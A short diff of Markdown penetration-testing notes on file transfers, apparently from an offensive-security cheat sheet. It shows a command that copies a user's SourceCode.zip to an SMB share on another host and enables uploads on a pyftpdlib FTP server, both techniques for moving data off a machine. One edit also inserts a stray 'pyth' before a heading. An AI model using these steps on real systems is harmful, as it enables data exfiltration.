@@ -1,4 +1,4 @@
-## Downloads
+pyth## Downloads
 
 ### PowerShell DownloadFile Method
 
@@ -79,7 +79,7 @@ copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 
 ```bash
 sudo pip3 install pyftpdlib
-sudo python3 -m pyftpdlib --port 21
+sudo python3 -m pyftpdlib --port 21 --write
 ```
 
 ```powershell
